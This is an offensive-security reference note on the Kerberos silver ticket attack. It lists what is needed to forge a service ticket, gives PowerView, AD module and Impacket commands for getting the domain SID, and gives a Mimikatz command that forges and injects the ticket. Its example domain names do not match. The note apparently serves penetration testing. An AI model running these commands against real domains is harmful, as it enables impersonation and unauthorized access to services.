# Silver Ticket Attack

> **Any** domain user can obtain a service ticket to any service in the domain. The service ticket is encrypted with the password hash of the user or computer account that the service is registered for. By retrieving and cracking the service ticket, it is possible to discover the service account's password hash. With the hash of a service account, you can create a ticket that can be used to interact with any of the services that the service account is registered for (i.e., has a [[service-principal-name|SPN]] for).

---

## Required pieces of information

1. The name of the user account to impersonate
    - Doesn't have to be a real user account
    - i.e., Administrator
2. The name of the domain
    - i.e., hydra.test
3. The SID of the domain
    - i.e., S-1-5-21-849420856-2351964222-986696166
4. The fully qualified domain name of the server
    - i.e., hydra-ws01.marvel.test
5. The target service name
    - i.e., SQLService
6. The NTLM/RC4 password hash of the target service
    - Obtainable via kerberoasting, SAM dump, secretsdump, etc.

---

## (PowerView) Obtain domain SID

```powershell
Get-DomainSID
```

---

## (Active Directory PowerShell Module) Obtain Domain SID

```powershell
Get-ADDomain
```

---

## (Impacket) Obtain Domain SID

```bash
lookupsid.py
```

---

## (Mimikatz) Create and Use the Silver Ticket

```powershell
mimikatz: kerberos::golden /user:$USER_TO_IMPERSONATE /domain:$DOMAIN /sid:$DOMAIN_SID /target:$FQDN_TARGET_SERVER /service:$TARGET_SERVICE_NAME /rc4:$NTLM_OR_RC4_HASH /ptt
```

Open up a new command prompt that leverages the silver ticket (must be in a GUI session to access the new command prompt).

```powershell
mimikatz: misc:cmd
```

---

## [(Impacket) Create and Use the Silver Ticket](https://yojimbosecurity.ninja/golden-ticket-with-impacket/)

- This method will need to be modified slightly for **silver** tickets.
